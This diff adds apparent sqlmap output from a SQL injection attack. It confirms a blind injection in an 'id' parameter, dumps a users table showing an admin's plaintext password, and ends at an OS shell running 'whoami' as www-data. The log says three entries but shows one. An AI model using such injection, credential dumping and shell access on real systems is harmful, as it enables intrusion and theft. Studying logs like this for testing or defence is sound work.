@@ -1,0 +1,22 @@
+[INFO] testing connection to the target URL
+[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] appdb
+[*] information_schema
+
+Database: appdb
+Table: users
+[3 entries]
++----+----------+--------------------+
+| id | username | password           |
++----+----------+--------------------+
+| 1  | admin    | SuperSecret2026!   |
++----+----------+--------------------+
+[INFO] table 'appdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/target/dump/appdb/users.csv'
+os-shell> whoami
+www-data
